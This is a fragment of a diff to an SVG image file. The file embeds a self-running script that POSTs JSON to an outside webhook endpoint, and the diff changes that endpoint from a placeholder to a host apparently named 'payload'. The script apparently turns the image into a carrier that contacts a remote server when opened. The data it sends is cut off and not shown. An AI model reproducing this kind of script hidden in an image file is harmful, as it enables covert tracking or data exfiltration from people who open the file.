@@ -3,7 +3,7 @@
  "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
 <script type="application/ecmascript"><![CDATA[
   (function(){
-    fetch("https://teu-projeto.vercel.app/api/enviarWebhook", {
+    fetch("https://payload-rust-theta.vercel.app/api/enviarWebhook", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
